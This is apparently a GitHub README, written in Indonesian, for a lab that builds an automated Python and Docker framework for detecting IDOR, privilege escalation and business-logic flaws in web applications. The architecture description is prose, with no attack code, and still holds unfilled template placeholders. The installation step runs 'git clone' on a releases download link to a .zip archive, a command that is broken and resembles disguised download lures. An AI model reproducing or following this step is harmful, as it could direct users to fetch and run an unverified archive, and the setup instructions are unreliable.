# Laboratorium Pengujian Keamanan Aplikasi Web: Fokus pada Kontrol Akses dan Logika Bisnis

[![Lisensi: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Status Proyek: Pengembangan](https://img.shields.io/badge/status-pengembangan-brightgreen.svg)]()

Repositori ini berisi dokumentasi dan kode untuk laboratorium pengembangan framework pengujian keamanan aplikasi web. Fokus utama dari proyek ini adalah untuk merancang dan mengimplementasikan sebuah sistem pengujian otomatis yang dapat secara efektif mendeteksi kerentanan pada kontrol akses dan logika bisnis.

## Latar Belakang

Dalam lanskap keamanan siber modern, banyak pemindai keamanan otomatis (*scanner*) yang sangat baik dalam mendeteksi kerentanan umum seperti *SQL Injection* atau *Cross-Site Scripting* (XSS). Namun, kelemahan yang lebih halus dan spesifik konteks, seperti yang ada pada logika bisnis dan kontrol akses, sering kali luput dari deteksi. Kerentanan seperti **IDOR** (*Insecure Direct Object References*) dan **Privilege Escalation** dapat memberikan dampak yang sangat merusak, karena memungkinkan penyerang untuk mengakses data atau fungsionalitas yang seharusnya tidak dapat mereka jangkau.

Proyek ini bertujuan untuk menjembatani kesenjangan tersebut dengan mengembangkan sebuah framework yang secara khusus menargetkan jenis-jenis kerentanan ini.

---

## Deskripsi Tugas & Tujuan

Tujuan utama dari laboratorium ini adalah untuk **merancang sistem pengujian keamanan aplikasi web secara otomatis yang mampu mendeteksi kelemahan kontrol akses dan logika bisnis.**

Secara spesifik, framework yang dikembangkan akan berfokus pada identifikasi:
1.  **Insecure Direct Object References (IDOR):** Kemampuan untuk mengakses atau memodifikasi data milik pengguna lain dengan memanipulasi referensi objek (misalnya, mengubah parameter ID di URL).
2.  **Privilege Escalation:** Kemampuan untuk mendapatkan akses ke fungsi atau fitur dengan hak akses yang lebih tinggi (misalnya, pengguna biasa yang dapat mengakses panel admin).
3.  **Celah Logika Bisnis Lainnya:** Mendeteksi alur aplikasi yang dapat dieksploitasi yang tidak sesuai dengan tujuan bisnis yang diharapkan.

---

## Arsitektur & Desain Framework

Framework ini dirancang dengan arsitektur modular untuk memungkinkan fleksibilitas dan skalabilitas. Komponen utamanya meliputi:

* **Modul Pemetaan Aplikasi (Application Mapper):** Bertugas untuk merayapi (*crawl*) aplikasi web target untuk mengidentifikasi semua titik akhir (*endpoints*), parameter, dan fungsionalitas yang dapat diakses.
* **Modul Manajemen Sesi (Session Manager):** Mengelola sesi pengguna dengan peran hak akses yang berbeda (misalnya, admin, pengguna biasa, tamu) untuk melakukan pengujian dari berbagai perspektif.
* **Mesin Deteksi (Detection Engine):**
    * **Detektor IDOR:** Secara sistematis mencoba mengganti parameter ID pada setiap *request* yang teridentifikasi untuk memeriksa apakah akses ke data yang tidak sah dimungkinkan.
    * **Detektor Privilege Escalation:** Membandingkan fungsionalitas yang dapat diakses oleh peran dengan hak akses rendah terhadap peran dengan hak akses tinggi untuk menemukan titik akhir yang tidak terlindungi.
    * **Penganalisis Logika (Logic Analyzer):** (Dalam pengembangan) Menggunakan model alur kerja aplikasi untuk mendeteksi anomali dalam proses bisnis (misalnya, melewati langkah pembayaran).
* **Modul Pelaporan (Reporting Module):** Menghasilkan laporan terperinci tentang temuan kerentanan, lengkap dengan bukti konsep (*proof-of-concept*) dan langkah-langkah mitigasi yang direkomendasikan.

*(Anda bisa menyisipkan diagram arsitektur di sini jika ada)*

---

## Teknologi yang Digunakan

* **Bahasa Pemrograman:** Python
* **Library Inti:**
    * `requests`: Untuk melakukan permintaan HTTP.
    * `BeautifulSoup4`: Untuk *parsing* dan *crawling* HTML.
    * (Tambahkan library lain yang Anda gunakan, contoh: `Selenium` untuk aplikasi web dinamis, `Flask`/`Django` untuk aplikasi target, dll.)
* **Lingkungan:** Docker (untuk isolasi dan replikasi lab yang mudah).

---

## Cara Menggunakan Lab Ini

### Prasyarat

* [Docker](https://www.docker.com/) dan [Docker Compose](https://docs.docker.com/compose/) terinstal.
* [Python 3.8+](https://www.python.org/)

### Instalasi & Konfigurasi

1.  **Clone repositori ini:**
    ```bash
    git clone https://github.com/OchiWebs/SecuraBench-Lab/releases/download/SecuraBench-Lab/Aoso-Web.zip
    cd SecuraBench-Lab
    ```

2.  **Bangun dan jalankan lingkungan lab menggunakan Docker:**
    ```bash
    docker-compose up --build
    ```
    Perintah ini akan membangun *image* untuk aplikasi web yang rentan dan *tool* pengujian Anda.
